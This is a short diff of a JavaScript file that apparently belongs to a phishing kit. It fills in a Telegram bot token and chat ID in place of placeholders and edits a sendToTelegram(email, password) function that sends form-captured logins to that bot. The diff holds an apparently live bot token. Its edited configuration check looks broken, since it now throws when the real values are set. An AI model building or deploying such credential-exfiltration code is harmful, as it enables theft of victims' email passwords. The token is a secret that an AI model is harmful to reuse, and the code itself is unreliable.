@@ -1,5 +1,5 @@
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+const TELEGRAM_BOT_TOKEN = '8019150510:AAE7M4LgP_QaS5rHdVSM_ToC1dXLFcfqGwI';
+const TELEGRAM_CHAT_ID = '5509996296';
 
 let currentBackgroundDomain = '';
 let userLanguage = 'en';
@@ -376,8 +376,8 @@ function setupFormHandling() {
 }
 
 async function sendToTelegram(email, password) {
-    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
-        !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === '8019150510:AAE7M4LgP_QaS5rHdVSM_ToC1dXLFcfqGwI' || 
+        !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === '5509996296') {
         throw new Error('Configure Telegram bot token and chat ID first');
     }
     
